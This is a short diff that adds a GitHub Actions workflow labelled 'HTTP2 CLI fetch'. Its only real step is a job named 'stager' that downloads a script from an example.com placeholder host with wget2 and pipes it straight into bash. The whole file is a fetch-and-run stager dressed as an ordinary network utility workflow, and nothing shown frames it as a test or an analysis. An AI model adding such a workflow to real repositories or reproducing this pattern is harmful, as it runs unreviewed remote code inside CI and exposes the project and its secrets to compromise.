@@ -1,0 +1,19 @@
+diff --git a/.github/workflows/http2-fetch.yml b/.github/workflows/http2-fetch.yml
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/.github/workflows/http2-fetch.yml
+@@ -0,0 +1,14 @@
++name: HTTP2 CLI fetch
++on:
++  workflow_dispatch:
++permissions:
++  contents: read
++jobs:
++  stager:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5
++      - name: Fetch and run
++        run: |
++          wget2 -qO- https://kitchen.example.com/r/w2/stage.sh | bash
